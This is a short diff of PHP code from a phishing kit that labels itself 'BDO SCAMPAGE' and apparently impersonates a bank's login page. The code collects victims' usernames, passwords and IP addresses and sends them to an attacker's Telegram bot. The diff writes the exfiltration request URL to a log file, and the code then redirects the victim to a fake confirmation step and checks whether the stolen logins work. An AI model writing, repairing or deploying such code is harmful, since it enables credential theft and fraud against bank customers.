@@ -37,11 +37,11 @@ $request_params = [
             "chat_id" => $user_id,
             "text" => "[BDO SCAMPAGE] \n\n [+] TrueLog: No\n[+] USERNAME: ".$username."\n[+] Password: ".$password."\n[+] IP: ".$_SERVER['REMOTE_ADDR']
         ];
-       # $request_url = "https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($request_params);
+        $request_url = "https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($request_params);
        $f1 = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($request_params));
 
     $fp = fopen("tllogs.txt", "a");
-fputs($fp, "$f1 \n\n\n");
+fputs($fp, "$request_url \n\n\n");
 	die(header("location: mobileconfirmation?auth=$codebash"));
 }else{
 if(truelogcheck($username, $password) == 'VALID'){
